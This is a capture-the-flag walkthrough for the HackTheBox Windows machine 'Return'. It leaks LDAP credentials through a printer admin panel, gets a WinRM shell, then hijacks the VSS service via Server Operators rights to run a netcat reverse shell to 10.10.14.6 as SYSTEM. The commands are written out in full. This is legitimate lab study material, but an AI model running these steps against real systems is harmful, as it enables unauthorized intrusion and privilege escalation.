## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)
- **Difficulty:** Easy  
- **Key Techniques:**  
  - Printer admin panel → LDAP creds  
  - WinRM → svc‑printer shell  
  - Server Operators → service hijack → SYSTEM  

---

## 🕵️ Recon

```bash
# Full TCP scan
nmap -p- --min-rate 10000 -oA nmap/return-alltcp 10.10.11.108

# Top ports + default scripts
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
  -sC -sV -oA nmap/return-services 10.10.11.108
```

- **IIS 10.0** on port 80 → “HTB Printer Admin Panel”  
- **LDAP** (389/636), **Kerberos** (88), **SMB** (445), **WinRM** (5985)  

---

## 🖨️ Shell as **svc-printer**

### 1. Leak LDAP credentials via admin panel

- Browse to `http://10.10.11.108/settings.php`  
- Change “Printer Hostname” to your IP:`http://10.10.14.6`  
- Listen on port 389:
  ```bash
  nc -lnvp 389
  ```
- Submit → the appliance attempts an LDAP bind to you, leaking:
  ```
  Username: return\svc-printer
  Password: 1edFg43012!!
  ```

### 2. WinRM / SMB access

```bash
# Verify WinRM
crackmapexec winrm 10.10.11.108 \
  -u svc-printer -p '1edFg43012!!'

# Shell via Evil-WinRM
evil-winrm -i 10.10.11.108 \
  -u svc-printer -p '1edFg43012!!'
```

- **User flag**:
  ```powershell
  type C:\Users\svc-printer\Desktop\user.txt
  # c0118264************************
  ```

---

## 👑 Shell as **SYSTEM**

### 1. Enumerate privileges & groups

```powershell
whoami /priv     # sees SeBackup, SeRestore, SeLoadDriver, …
whoami /groups   # member of BUILTIN\Server Operators
```

> **Server Operators** can _start/stop services_ on the host.

### 2. Hijack Windows service

1. **Upload** `nc64.exe` to `C:\ProgramData\nc64.exe`.  
2. **Reconfigure** the `VSS` service to run your payload:

   ```powershell
   sc.exe config VSS binpath=\
     "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd 10.10.14.6 443"
   ```
3. **Start** it (it will time out, but your shell persists):

   ```powershell
   sc.exe start VSS
   ```

4. **Catch your SYSTEM shell**:

   ```bash
   nc -lnvp 443
   # → nt authority\system
   ```

- **Root flag**:
  ```powershell
  type C:\Users\Administrator\Desktop\root.txt
  # 2e3771d0************************
  ```

---

## 🎉 Summary

1. **Printer Admin** → LDAP bind → `svc-printer:1edFg43012!!`  
2. **WinRM** → `svc-printer` shell  
3. **Server Operators** → modify `VSS` service → SYSTEM shell  
